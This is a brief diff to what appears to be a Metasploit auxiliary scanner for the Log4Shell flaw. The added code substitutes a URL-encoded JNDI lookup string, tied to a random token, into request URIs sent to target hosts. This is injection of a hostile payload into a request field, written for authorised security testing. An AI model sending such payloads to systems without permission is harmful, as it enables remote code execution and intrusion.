@@ -137,7 +137,14 @@ class MetasploitModule < Msf::Auxiliary
       uri.strip!
       next if uri.start_with?('#')
 
-      run_host_uri(ip, normalize_uri(target_uri, uri))
+      if uri.include?('${jndi:uri}')
+        token = rand_text_alpha_lower_numeric(8..32)
+        jndi = jndi_string(token)
+        uri.delete_prefix!('/')
+        test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))
+      else
+        run_host_uri(ip, normalize_uri(target_uri, uri))
+      end
     end
   end
 
